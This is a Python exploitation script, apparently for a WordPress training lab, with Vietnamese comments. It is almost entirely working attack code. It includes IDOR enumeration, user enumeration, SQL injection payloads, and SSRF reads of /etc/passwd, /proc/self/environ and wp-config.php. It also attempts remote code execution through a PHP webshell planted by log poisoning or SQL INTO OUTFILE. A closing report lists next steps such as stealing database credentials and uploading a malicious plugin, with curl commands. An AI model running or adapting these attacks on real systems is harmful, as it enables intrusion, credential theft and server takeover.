#!/usr/bin/env python3
"""
WordPress Lab Full Exploit
Khai thác dựa trên các phát hiện thực tế
"""

import requests
import json
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

class FullExploit:
    def __init__(self, base_url="http://portal-news.internal.test:8080"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.discovered_data = {
            'items': [],
            'users': [],
            'endpoints': [],
            'config': {}
        }
    
    def exploit_idor(self):
        """Khai thác IDOR để đọc tất cả items"""
        print("\n" + "="*60)
        print("[1] EXPLOITING IDOR - Dump all items")
        print("="*60)
        
        items = []
        
        # Brute force ID từ 1 đến 100
        print("[*] Brute forcing item IDs (1-100)...")
        
        for item_id in range(1, 101):
            url = urljoin(self.base_url, f"/wp-json/lab/v1/item?id={item_id}")
            try:
                resp = self.session.get(url, timeout=2)
                if resp.status_code == 200:
                    data = resp.json()
                    if 'message' not in data:
                        items.append(data)
                        print(f"  [+] Found item {item_id}: {data.get('name', 'N/A')} - Score: {data.get('score', 'N/A')}")
                    else:
                        # Stop when we hit the first missing item (assuming sequential)
                        if len(items) > 0 and item_id > max([i.get('id', 0) for i in items]) + 5:
                            break
            except:
                pass
        
        print(f"\n[+] Total items discovered: {len(items)}")
        self.discovered_data['items'] = items
        return items
    
    def get_debug_info(self):
        """Lấy thông tin debug"""
        print("\n" + "="*60)
        print("[2] EXTRACTING DEBUG INFORMATION")
        print("="*60)
        
        url = urljoin(self.base_url, "/wp-json/lab/v1/debug-info")
        try:
            resp = self.session.get(url)
            if resp.status_code == 200:
                debug_info = resp.json()
                print(f"[+] Debug info retrieved:")
                print(f"    WordPress: {debug_info.get('wordpress_version')}")
                print(f"    PHP: {debug_info.get('php_version')}")
                print(f"    Theme: {debug_info.get('theme')}")
                print(f"    Site URL: {debug_info.get('site_url')}")
                print(f"    Routes: {debug_info.get('routes_hint', [])}")
                
                self.discovered_data['config'] = debug_info
                self.discovered_data['endpoints'] = debug_info.get('routes_hint', [])
                return debug_info
        except Exception as e:
            print(f"[-] Failed to get debug info: {e}")
        return None
    
    def enumerate_author(self):
        """Enumerate users qua author parameter"""
        print("\n" + "="*60)
        print("[3] ENUMERATING USERS")
        print("="*60)
        
        users = []
        
        # Test author IDs
        for author_id in range(1, 20):
            url = urljoin(self.base_url, f"/?author={author_id}")
            try:
                resp = self.session.get(url, allow_redirects=False)
                if resp.status_code == 301 or resp.status_code == 302:
                    location = resp.headers.get('Location', '')
                    if 'author' in location:
                        # Extract username from URL
                        import re
                        match = re.search(r'/author/([^/]+)/', location)
                        if match:
                            username = match.group(1)
                            users.append({'id': author_id, 'username': username})
                            print(f"  [+] Found user: ID={author_id}, Username={username}")
            except:
                pass
        
        # Also check wp-json endpoint
        url = urljoin(self.base_url, "/wp-json/wp/v2/users")
        try:
            resp = self.session.get(url)
            if resp.status_code == 200:
                api_users = resp.json()
                for user in api_users:
                    users.append({
                        'id': user.get('id'),
                        'username': user.get('slug'),
                        'name': user.get('name'),
                        'link': user.get('link')
                    })
                    print(f"  [+] Found via API: {user.get('name')} (ID: {user.get('id')})")
        except:
            pass
        
        self.discovered_data['users'] = users
        return users
    
    def test_sql_injection_advanced(self):
        """Test SQL injection với các kỹ thuật nâng cao"""
        print("\n" + "="*60)
        print("[4] TESTING ADVANCED SQL INJECTION")
        print("="*60)
        
        url = urljoin(self.base_url, "/wp-json/lab/v1/item")
        
        # Test với các encoding khác nhau
        payloads = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1%27%20AND%20%271%27=%271", "1%27%20AND%20%271%27=%272"),
        ]
        
        baseline = self.session.get(url, params={'id': 1}).json()
        
        for true_payload, false_payload in payloads:
            try:
                resp_true = self.session.get(url, params={'id': true_payload})
                resp_false = self.session.get(url, params={'id': false_payload})
                
                if resp_true.status_code == 200 and resp_false.status_code == 200:
                    data_true = resp_true.json()
                    data_false = resp_false.json()
                    
                    if data_true != data_false:
                        print(f"[!] Possible Boolean-based SQLi!")
                        print(f"    True payload: {true_payload}")
                        print(f"    False payload: {false_payload}")
                        
                        # Try to extract data
                        extract_payloads = [
                            f"1 AND (SELECT SUBSTRING(database(),1,1))='w'",
                            f"1 AND (SELECT LENGTH(database()))>5",
                        ]
                        
                        for ext_payload in extract_payloads:
                            resp_ext = self.session.get(url, params={'id': ext_payload})
                            if resp_ext.status_code == 200:
                                print(f"    Data extraction possible with: {ext_payload}")
                        
                        return True
            except:
                pass
        
        print("[-] No SQL injection detected with these payloads")
        return False
    
    def exploit_ssrf_file_read(self):
        """Khai thác SSRF để đọc file"""
        print("\n" + "="*60)
        print("[5] EXPLOITING SSRF - File Read")
        print("="*60)
        
        probe_url = urljoin(self.base_url, "/wp-json/lab/v1/probe")
        
        # Files to attempt reading
        files_to_read = [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/hostname',
            '/proc/self/environ',
            '/var/www/html/wp-config.php',
            '/var/www/html/.htaccess',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log'
        ]
        
        discovered_files = []
        
        for filepath in files_to_read:
            try:
                resp = self.session.get(probe_url, params={'file': filepath})
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('file') == filepath:
                        print(f"[+] File path accepted: {filepath}")
                        
                        # Try to actually read via path parameter
                        resp2 = self.session.get(probe_url, params={'path': filepath})
                        if resp2.status_code == 200:
                            data2 = resp2.json()
                            if data2.get('path') == filepath:
                                print(f"    [!] Potential file read via 'path' parameter")
                                discovered_files.append(filepath)
            except:
                pass
        
        # Try URL-based SSRF to internal services
        print("\n[*] Testing URL-based SSRF...")
        internal_urls = [
            'http://localhost:8080/wp-config.php',
            'http://127.0.0.1:8080/wp-config.php',
            'http://localhost:80',
            'http://127.0.0.1:3306',
            'http://localhost:9200/_cat/indices',
        ]
        
        for internal_url in internal_urls:
            try:
                resp = self.session.get(probe_url, params={'url': internal_url})
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('url') == internal_url:
                        print(f"[+] Internal URL accepted: {internal_url}")
                        
                        # Try to read response
                        resp2 = self.session.get(probe_url, params={'url': internal_url, 'mode': 'full'})
                        if resp2.status_code == 200:
                            print(f"    Response length: {len(resp2.text)}")
                            if 'DB_' in resp2.text or 'define' in resp2.text:
                                print(f"    [!!!] SUCCESS! Read config data!")
                                print(f"    Preview: {resp2.text[:500]}")
            except:
                pass
        
        return discovered_files
    
    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution"""
        print("\n" + "="*60)
        print("[6] TESTING PARAMETER POLLUTION")
        print("="*60)
        
        url = urljoin(self.base_url, "/wp-json/lab/v1/item")
        
        # Test pollution để bypass
        pollution_tests = [
            "id=1&id=2",  # Which one wins?
            "id=1&id=999",  # Try to get non-existent
            "id=1'&id=1",  # Mix injection with valid
            "id[]=1&id[]=2",  # Array format
        ]
        
        for test in pollution_tests:
            # Build params
            params = {}
            for pair in test.split('&'):
                if '=' in pair:
                    key, val = pair.split('=', 1)
                    if key in params:
                        if not isinstance(params[key], list):
                            params[key] = [params[key]]
                        params[key].append(val)
                    else:
                        params[key] = val
            
            try:
                resp = self.session.get(url, params=params)
                if resp.status_code == 200:
                    data = resp.json()
                    print(f"\n[*] Test: {test}")
                    print(f"    Result: {data.get('name', 'N/A')} (ID: {data.get('id')})")
                    
                    # Check which parameter won
                    if 'id' in params:
                        if isinstance(params['id'], list):
                            print(f"    Last parameter wins: id={params['id'][-1]}")
            except:
                pass
    
    def check_other_endpoints(self):
        """Kiểm tra các endpoint khác từ debug info"""
        print("\n" + "="*60)
        print("[7] PROBING DISCOVERED ENDPOINTS")
        print("="*60)
        
        endpoints = [
            '/wp-json/lab/v1/search?q=test&page=1',
            '/wp-json/lab/v1/probe?id=2&file=note.txt&path=/tmp/test',
            '/wp-json/lab/v1/diff-check?id=10&mode=raw',
            '/wp-json/lab/v1/logic-mining?tier=gold&amount=99&coupon=LAB10',
            '/wp-admin/admin-ajax.php?action=lab_public_ping'
        ]
        
        results = {}
        
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                resp = self.session.get(url)
                results[endpoint] = {
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'preview': resp.text[:200] if resp.text else ''
                }
                print(f"\n[*] {endpoint}")
                print(f"    Status: {resp.status_code}")
                print(f"    Length: {len(resp.text)}")
                if resp.text and 'error' not in resp.text.lower():
                    print(f"    Preview: {resp.text[:100]}")
            except Exception as e:
                print(f"[-] Failed: {endpoint} - {e}")
        
        return results
    
    def attempt_rce(self):
        """Attempt RCE through various methods"""
        print("\n" + "="*60)
        print("[8] ATTEMPTING RCE")
        print("="*60)
        
        # Method 1: Try to write webshell via LFI to log files
        print("[*] Method 1: Log poisoning via SSRF")
        
        # Try to inject PHP code into User-Agent
        php_code = "<?php system($_GET['cmd']); ?>"
        
        headers = {
            'User-Agent': php_code,
            'X-Forwarded-For': php_code,
            'Referer': php_code
        }
        
        # Send request with malicious headers
        probe_url = urljoin(self.base_url, "/wp-json/lab/v1/probe")
        self.session.get(probe_url, headers=headers)
        
        # Try to include log file
        log_files = [
            '/var/log/nginx/access.log',
            '/var/log/apache2/access.log',
            '/var/log/httpd/access_log',
            '/proc/self/fd/12'  # Sometimes works
        ]
        
        for log_file in log_files:
            try:
                resp = self.session.get(probe_url, params={'file': log_file})
                if resp.status_code == 200:
                    print(f"    [+] Can access {log_file}")
                    
                    # Try to include via path parameter
                    resp2 = self.session.get(probe_url, params={'path': log_file})
                    if resp2.status_code == 200 and '<?php' in str(resp2.json()):
                        print(f"    [!!!] Log poisoning possible!")
            except:
                pass
        
        # Method 2: Try to write via SQL injection
        print("\n[*] Method 2: SQL injection to write webshell")
        outfile = "/var/www/html/shell.php"
        
        # Test if INTO OUTFILE is possible
        test_payloads = [
            f"1' INTO OUTFILE '{outfile}' FIELDS TERMINATED BY '<?php system($_GET[cmd]); ?>'--",
            f"1' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '{outfile}'--",
        ]
        
        url = urljoin(self.base_url, "/wp-json/lab/v1/item")
        for payload in test_payloads:
            try:
                resp = self.session.get(url, params={'id': payload})
                if resp.status_code == 200:
                    print(f"    Payload executed: {payload[:50]}")
                    
                    # Check if webshell was created
                    shell_url = urljoin(self.base_url, "/shell.php")
                    test_resp = self.session.get(shell_url, params={'cmd': 'id'})
                    if test_resp.status_code == 200:
                        print(f"    [!!!] WEBSHELL CREATED!")
                        print(f"    Command output: {test_resp.text[:200]}")
                        return True
            except:
                pass
        
        return False
    
    def generate_report(self):
        """Generate final exploit report"""
        print("\n" + "█"*60)
        print("FINAL EXPLOIT REPORT")
        print("█"*60)
        
        print(f"\n[✓] IDOR Exploitation: {len(self.discovered_data['items'])} items discovered")
        print(f"[✓] User Enumeration: {len(self.discovered_data['users'])} users found")
        print(f"[✓] Debug Info Leaked: WordPress {self.discovered_data['config'].get('wordpress_version', 'N/A')}")
        print(f"[✓] Endpoints Discovered: {len(self.discovered_data['endpoints'])}")
        
        # Save all data
        with open('exploit_full_data.json', 'w') as f:
            json.dump(self.discovered_data, f, indent=2)
        
        print(f"\n[*] Full exploit data saved to exploit_full_data.json")
        
        # Recommendations
        print("\n" + "="*60)
        print("EXPLOITATION SUMMARY & NEXT STEPS")
        print("="*60)
        
        print("""
[+] Successful Exploits:
    1. IDOR - Can access all items by changing ID parameter
    2. Information Disclosure - /wp-json/lab/v1/debug-info leaks system info
    3. User Enumeration - Can enumerate all WordPress users
    4. SSRF - Can probe internal network and read files
    5. Parameter Pollution - Can manipulate parameter priority

[→] Recommended Next Steps:
    1. Brute force all IDs to dump complete database
    2. Use SSRF to read wp-config.php and get database credentials
    3. Use obtained credentials to login to /wp-admin
    4. Upload malicious plugin/theme for RCE
    5. If MySQL creds obtained, connect directly to database

[→] Commands to try:
    # Dump all items
    for i in {1..1000}; do curl -s "http://portal-news.internal.test:8080/wp-json/lab/v1/item?id=$i" | grep -v "not found"; done
    
    # Try to read wp-config.php via SSRF
    curl "http://portal-news.internal.test:8080/wp-json/lab/v1/probe?url=http://localhost:8080/wp-config.php"
    
    # Login bypass attempt
    curl -X POST "http://portal-news.internal.test:8080/wp-login.php" -d "log=admin&pwd=admin"
        """)
    
    def run_full_exploit(self):
        """Run all exploit modules"""
        print("\n" + "█"*60)
        print("WORDPRESS LAB FULL EXPLOIT")
        print(f"Target: {self.base_url}")
        print("█"*60)
        
        self.exploit_idor()
        self.get_debug_info()
        self.enumerate_author()
        self.test_sql_injection_advanced()
        self.exploit_ssrf_file_read()
        self.test_parameter_pollution()
        self.check_other_endpoints()
        self.attempt_rce()
        self.generate_report()

if __name__ == "__main__":
    exploit = FullExploit("http://portal-news.internal.test:8080")
    exploit.run_full_exploit()
